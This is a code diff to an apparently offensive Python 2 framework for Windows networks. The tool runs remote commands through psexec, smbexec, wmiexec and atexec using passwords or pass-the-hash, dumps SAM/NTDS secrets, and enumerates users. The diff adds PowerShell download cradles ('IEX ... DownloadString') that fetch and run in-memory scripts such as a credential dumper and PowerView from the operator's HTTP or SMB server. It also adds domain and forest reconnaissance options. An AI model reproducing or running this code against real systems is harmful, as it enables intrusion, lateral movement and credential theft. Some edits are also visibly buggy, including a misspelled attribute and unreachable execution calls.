@@ -2994,7 +2994,6 @@ TIMEOUT SIGNAL TERMINATION
 class Timeout():
     """Timeout class using ALARM signal."""
     class Timeout(Exception):
-        print("[!] The attack timed out")
         pass
     def __init__(self, sec):
         self.sec = sec
@@ -3103,7 +3102,7 @@ class NetviewDetails:
 
 
 class Obfiscator:
-    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, group, delivery, share_name, dst_ip="", dst_port=""):
+    def __init__(self, src_ip, src_port, payload, function, argument, execution, methods, domain_group, delivery, share_name, domain_name, local_group, dst_ip="", dst_port=""):
         self.src_ip = src_ip
         self.dst_ip = dst_ip
         self.dst_port = dst_port
@@ -3113,11 +3112,13 @@ class Obfiscator:
         self.argument = argument
         self.execution = execution
         self.methods = methods
-        self.group = group
+        self.domain_group = domain_group
+        self.loacl_group = local_group
         self.command = ""
         self.unprotected_command = ""
         self.delivery = delivery
         self.share_name = share_name
+        self.domain_name = domain_name
         try:
             self.run()
         except Exception, e:
@@ -3134,9 +3135,12 @@ class Obfiscator:
         elif "executor" in self.execution:
             # Direct PowerShell execution
             self.executor()
-        elif "group" in self.execution:
+        elif "domain_group" in self.execution:
             # Extract Group Members
-            self.group_members()
+            self.domain_group_members()
+        elif "local_group" in self.execution:
+            # Extract Local Group Memebers
+            self.local_group_members()
 
     def packager(self, cleartext):
         encoded_utf = cleartext.encode('utf-16-le')
@@ -3185,11 +3189,37 @@ class Obfiscator:
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
 
-    def group_members(self):
+    def domain_group_members(self):
         # Group Membership
-        text = "Get-ADGroupMember -identity %s -Recursive | Get-ADUser -Property DisplayName | Select Name,ObjectClass,DisplayName" % (str(self.group))
+        if self.delivery == "web":
+            if self.argument:
+                text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+            else:
+                text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
+        elif self.delivery == "smb":
+            if self.argument:
+                text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function), str(self.argument))
+            else:
+                text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function))
         self.command = self.packager(text)
         self.unprotected_command = self.clearer(text)
+
+    def local_group_members(self):
+        # Local Group Membership
+        if self.delivery == "web":
+            if self.argument:
+                text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function), str(self.argument))
+            else:
+                text = "IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/%s'); %s" % (str(self.src_ip), str(self.src_port), str(self.payload), str(self.function))
+        elif self.delivery == "smb":
+            if self.argument:
+                text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function), str(self.argument))
+            else:
+                text = "IEX (New-Object Net.WebClient).DownloadString('\\\%s\%s\%s'); %s" % (str(self.src_ip), str(self.share_name), str(self.payload), str(self.function))
+        self.command = self.packager(text)
+        self.unprotected_command = self.clearer(text)
+        print(self.command) #DEBUG
+        print(self.unprotected_command) #DEBUG
 
 '''
 LOCAL INTERFACE DETECTION FUNCTIONS
@@ -3276,15 +3306,20 @@ def delivery_server(port, working_dir, delivery_method, share_name):
     return sub_proc
 
 def http_server(port, working_dir):
-    null = open('/dev/null', 'w')
-    sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir, stdout=null, stderr=null,)
+    devnull = open(os.devnull, 'w')
+    sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir, stdout=devnull, stderr=devnull)
+    #sub_proc = subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', port], cwd=working_dir)
     #Test Server
     test_request = "http://127.0.0.1:%s" % (port)
+    time.sleep(1) #DEBUG
     try:
         urllib2.urlopen(test_request).read()
         print("[*] Catapult web server started successfully on port: %s in directory: %s") % (port, working_dir)
     except Exception, e:
         print("[!] Catapult web server failed to start")
+        print("[*] Verify the port is not already in use")
+        sub_proc.terminate()
+        sub_proc = None
     return sub_proc
 
 def smb_server(working_dir, share_name):
@@ -3306,7 +3341,7 @@ METHOD FUNCTIONS
 '''
 
 def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, scan_type, verbose, verify_port, encoder, timeout_value):
-    srv = ""
+    srv = None
     if hash and not pwd:
         print("[-] --atexec requires a password, please try a different user or crack hash %s for user %s") % (hash, usr)
         return
@@ -3324,24 +3359,49 @@ def atexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
         sys.exit("[!] Please provide a viable command for execution")
     if attacks and encoder:
         srv = delivery_server(src_port, cwd, delivery, share_name)
+        if not srv:
+            sys.exit("[!] To execute this attack the catapult server needs to start")
         with Timeout(timeout_value):
-            shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command, proto = protocol)
-            shell.play(dst)
+            try:
+                shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command, proto = protocol)
+                shell.play(dst)
+            except (Exception, KeyboardInterrupt), e:
+                print("[!] An error occured: %s") % (e)
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+                return
     elif attacks and not encoder:
         srv = delivery_server(src_port, cwd, delivery, share_name)
+        if not srv:
+            sys.exit("[!] To execute this attack the catapult server needs to start")
         with Timeout(timeout_value):
-            shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command, proto = protocol)
-            shell.play(dst)
-    else:
+            try:
+                shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command, proto = protocol)
+                shell.play(dst)
+            except (Exception, KeyboardInterrupt), e:
+                print("[!] An error occured: %s") % (e)
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+                return
+    else:         
         with Timeout(timeout_value):
-            shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command, proto = protocol)
-            shell.play(dst)
+            try:
+                shell = ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command, proto = protocol)
+                shell.play(dst)
+            except (Exception, KeyboardInterrupt), e:
+                print("[!] An error occured: %s") % (e)
+                if srv:
+                    srv.terminate()
+                    print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+                return
     if srv:
        srv.terminate()
        print("[*] Shutting down the catapult %s server for %s"  % (str(delivery), str(dst)))
 
 def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, directory, scan_type, verbose, verify_port, timeout_value):
-    srv = ""
+    srv = None
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3351,18 +3411,27 @@ def psexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, c
     if attacks:
         #print(instructions)
         srv = delivery_server(src_port, cwd, delivery, share_name)
+        if not srv:
+            sys.exit("[!] To execute this attack the catapult server needs to start")
     if hash:
         print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
     else:
         print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-    shell = PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
-    shell.run(dst)
+    try:
+        shell = PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
+        shell.run(dst)
+    except (Exception, KeyboardInterrupt), e:
+        print("[!] An error occured: %s") % (e)
+        if srv:
+            srv.terminate()
+            print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+        return
     if srv:
         srv.terminate()
         print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
 
 def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, scan_type, verbose, verify_port, timeout_value):
-    srv = ""
+    srv = None
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3372,18 +3441,27 @@ def smbexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
     if attacks:
         print(instructions)
         srv = delivery_server(src_port, cwd, delivery, share_name)
+        if not srv:
+            sys.exit("[!] To execute this attack the catapult server needs to start")
     if hash:
         print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
     else:
         print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-    shell = CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
-    shell.run(dst)
+    try:
+        shell = CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
+        shell.run(dst)
+    except (Exception, KeyboardInterrupt), e:
+        print("[!] An error occured: %s") % (e)
+        if srv:
+            srv.terminate()
+            print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
+        return
     if srv:
         srv.terminate()
         print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
 
 def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, command, unprotected_command, protocol, attacks, kerberos, aes, mode, share, instructions, no_output, scan_type, verbose, verify_port, encoder, timeout_value):
-    srv = ""
+    srv = None
     if scan_type:
         state = verify_open(verbose, scan_type, verify_port, dst)
         if not state:
@@ -3400,15 +3478,17 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
         with Timeout(timeout_value):
             try:
                 srv = delivery_server(src_port, cwd, delivery, share_name)
+                if not srv:
+                    sys.exit("[!] To execute this attack the catapult server needs to start")
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
-            except Exception, e:
+            except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if srv:
                     srv.terminate()
                     print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
-                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                    return #replaced continue inside a function
+                print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                return #replaced continue inside a function
     elif attacks and not encoder:
         if hash:
             print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -3419,15 +3499,17 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
         with Timeout(timeout_value):
             try:
                 srv = delivery_server(src_port, cwd, delivery, share_name)
+                if not srv:
+                    sys.exit("[!] To execute this attack the catapult server needs to start")
                 shell = WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
-            except Exception, e:
+            except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if srv:
                     srv.terminate()
                     print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
-                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                    return #changed from continue inside a function
+                print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                return #changed from continue inside a function
     elif attacks:
         if hash:
             print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -3438,15 +3520,17 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
         with Timeout(timeout_value):
             try:
                 srv = delivery_server(src_port, cwd, delivery, share_name)
-                shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                shell.run(dst)
-            except Exception, e:
+                if not srv:
+                    sys.exit("[!] To execute this attack the catapult server needs to start")
+                    shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                    shell.run(dst)
+            except (Exception, KeyboardInterrupt), e:
                 print("[!] An error occurred: %s") % (e)
                 if srv:
                     srv.terminate()
                     print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
-                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                    return # changed from continue inside a function
+                print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                return # changed from continue inside a function
     else:
         if hash:
             print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
@@ -3458,13 +3542,12 @@ def wmiexec_func(dst, src_port, cwd, delivery, share_name, usr, hash, pwd, dom, 
             try:
                 shell = WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
                 shell.run(dst)
-            except Exception, e:
-                print("[!] An error occurred: %s") % (e)
+            except (Exception, KeyboardInterrupt), e:
                 if srv:
                     srv.terminate()
                     print("[*] Shutting down the catapult %s server for %s") % (str(delivery), str(dst))
-                    print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
-                    return # changed from continue inside a function
+                print("[-] Could not execute the command against %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
+                return # changed from continue inside a function
 
 def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods, scan_type, verbose, verify_port, timeout_value): 
     if scan_type:
@@ -3480,8 +3563,13 @@ def netview_func(dst, usr, pwd, dom, hash, aes, kerberos, final_targets, methods
     else:
         print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
     opted = NetviewDetails(user = None, users = None, target = dst, targets = None, noloop = True, delay = '10', max_connections = '1000', domainController = None, debug = False)
-    shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
-    shell.run()
+    try:
+        shell = USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
+        shell.run()
+    except (Exception, KeyboardInterrupt), e:
+        print("[!] An error occured: %s") % (e)
+        return
+
 
 def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntds, pwd, scan_type, verbose, verify_port, timeout_value):
     if scan_type:
@@ -3497,8 +3585,9 @@ def sam_dump_func(dst, usr, hash, dom, aes, kerberos, system, security, sam, ntd
     shell = DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
     try:
         shell.dump()
-    except Execption, e:
+    except (Exception, KeyboardInterrupt), e:
         print("[!] An error occured during execution")
+        return
 
 
 def instructions_func(payload, src_port, command, unprotected_command, smbexec_cmd, execution, delivery):
@@ -3710,7 +3799,12 @@ Create Pasteable Double Encoded Script:
     attack.add_argument("--secrets-dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
     attack.add_argument("--executor", action="store_true", dest="executor", help="Execute a PowerShell Script")
     attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
-    attack.add_argument("--group-members", action="store", dest="group", help="Identifies members of Domain Groups through PowerShell")
+    attack.add_argument("--domain-group-members", action="store", dest="domain_group", help="Identifies members of Domain Groups through PowerShell")
+    attack.add_argument("--local-group-members", action="store", dest="local_group", help="Identifies members of Local Groups through PowerShell")
+    attack.add_argument("--get-domain", action="store_true", dest="get_domain", default=False, help="Identifies current user's Domain")
+    attack.add_argument("--get-forest-domains", action="store_true", dest="get_forest_domains", default=False, help="Identifies current user's Domains within the Forest")
+    attack.add_argument("--get-forest", action="store_true", dest="get_forest", default=False, help="Identifies current user's Forrest")
+    attack.add_argument("--get-dc", action="store_true", dest="get_dc", default=False, help="Identifies current user's Domain Controllers")
     remote_attack.add_argument("-t", action="store", dest="target", default=None, help="The targets you are attempting to exploit, multiple items can be comma seperated: Accepts IPs, CIDR, Short and Long Ranges")
     remote_attack.add_argument("-e", action="store", dest="exceptor", default=None, help="The exceptions to the targets you do not want to exploit, yours is inlcuded by default, multiple items can be comma seperated: Accepts IPs, CIDR, Short and Long Ranges")
     remote_attack.add_argument("-tl", action="store", dest="target_filename", default=None, help="The targets file with systems you want to exploit, delinated by new lines, multiple files can be comma separated")
@@ -3729,12 +3823,13 @@ Create Pasteable Double Encoded Script:
     method.add_argument("--atexec", action="store_true", dest="atexec_cmd", help="Inject the command task into the system memory with at on systems older than Vista")
     attack.add_argument("--scout", action="store_true", dest="netview_cmd", help="Identify logged in users on a target machine")
     #generator.add_argument("--filename", action="store", dest="filename", default=None, help="The file that the attack script will be dumped to")
+    remote_attack.add_argument("--domain", action="store", dest="target_dom", default=None, help="When querying for details of different domains")
     remote_attack.add_argument("--aes", action="store", dest="aes_key", default=None, help="The AES Key Option")
     remote_attack.add_argument("--share", action="store", default="ADMIN$", dest="share", help="The Share to execute against, the default is ADMIN$")
     remote_attack.add_argument('--mode', action="store", dest="mode", choices=['SERVER','SHARE'], default="SERVER", help="Mode to use for --smbexec, default is SERVER, which requires root access, SHARE does not")
     remote_attack.add_argument("--protocol", action="store", dest="protocol", choices=['445/SMB','139/SMB'], default="445/SMB", help="The protocol to attack over, the default is 445/SMB")
     remote_attack.add_argument("--directory", action="store", dest="directory", default="C:\\", help="The directory to either drop the payload or instantiate the session")
-    remote_attack.add_argument("--timeout", action="store", dest="timeout_value", default=100, help="How long you want a test to wait before it is cancelled, the default is 100 seconds")
+    remote_attack.add_argument("--timeout", action="store", dest="timeout_value", default=30, help="How long you want a test to wait before it is cancelled, the default is 30 seconds")
     remote_attack.add_argument("--sleep", action="store", dest="sleep_value", default=0, help="How many seconds you want to delay each iteration of tests when multiple hosts or credentials are provided, the default is 0")
     sam_dump_options.add_argument("--system", action="store", help="The SYSTEM hive to parse")
     sam_dump_options.add_argument("--security", action="store", help="The SECURITY hive to parse")
@@ -3794,7 +3889,12 @@ Create Pasteable Double Encoded Script:
     wmiexec_cmd = args.wmiexec_cmd     # Holds the results for the wmiexec execution
     psexec_cmd = args.psexec_cmd       # Holds the results for the psexec execution
     atexec_cmd = args.atexec_cmd
+    get_domain = args.get_domain
+    get_forest = args.get_forest
+    get_forest_domains = args.get_forest_domains
+    get_dc = args.get_dc
     netview_cmd = args.netview_cmd
+    target_dom = args.target_dom
     aes = args.aes_key
     share = args.share
     protocol = args.protocol
@@ -3814,7 +3914,8 @@ Create Pasteable Double Encoded Script:
     security = args.security
     sam = args.sam
     ntds = args.ntds
-    group = args.group
+    domain_group = args.domain_group
+    local_group = args.local_group
     encoder = args.encoder
     xml_targets = args.xml_targets
     xml_exceptions = args.xml_exceptions
@@ -4099,24 +4200,85 @@ Create Pasteable Double Encoded Script:
             mim_arg = "-DumpCreds"
         if payload == None:
             payload = "im.ps1"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
+        attacks = True
     elif executor:
         if not payload or not mim_func:
             sys.exit("[!] You must provide at least the name tool to be injected into memory and the cmdlet name to be executed")
         execution = "executor"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
+        attacks = True
     elif downloader:
         if delivery == "smb":
             sys.exit("[!] The Metasploit web_delivery module only works through web server based attacks")
         execution = "downloader"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
-    elif group:
-        execution = "group"
-        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, group, delivery, share_name)
+    elif domain_group:
+        execution = "domain_group"
+        domain_group = "'" + domain_group + "'"
+        if mim_func == None:
+            mim_func = "Get-NetGroup"
+        if mim_arg == None:
+            if not target_dom:
+                mim_arg = "-GroupName %s -Domain %s" % (domain_group, dom)
+            else:
+                mim_arg = "-GroupName %s -Domain %s" % (domain_group, target_dom)
+        if payload == None:
+            payload = "pv.ps1"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
         command, unprotected_command = x.return_command()
+        attacks = True
+    elif local_group:
+        execution = "local_group"
+        local_group = "'" + local_group + "'"
+        if mim_func == None:
+            mim_func = "Get-NetLocalGroup"
+        if mim_arg == None:
+            mim_arg = "-GroupName %s" % (local_group)
+        if payload == None:
+            payload = "pv.ps1"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
+        command, unprotected_command = x.return_command()
+        attacks = True
+    elif get_domain:
+        execution = "executor"
+        if mim_func == None:
+            mim_func = "Get-NetDomain"
+        if payload == None:
+            payload = "pv.ps1"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
+        command, unprotected_command = x.return_command()
+        attacks = True
+    elif get_forest:
+        execution = "executor"
+        if mim_func == None:
+            mim_func = "Get-NetForest"
+        if payload == None:
+            payload = "pv.ps1"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
+        command, unprotected_command = x.return_command()
+        attacks = True
+    elif get_forest_domains:
+        execution = "executor"
+        if mim_func == None:
+            mim_func = "Get-NetForestDomains"
+        if payload == None:
+            payload = "pv.ps1"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
+        command, unprotected_command = x.return_command()
+        attacks = True
+    elif get_dc:
+        execution = "executor"
+        if mim_func == None:
+            mim_func = "Get-NetDomainControllers"
+        if payload == None:
+            payload = "pv.ps1"
+        x = Obfiscator(src_ip, src_port, payload, mim_func, mim_arg, execution, method_dict, domain_group, delivery, share_name, dom, local_group)
+        command, unprotected_command = x.return_command()
+        attacks = True
     elif netview_cmd:
         attacks = True
     elif sam_dump:
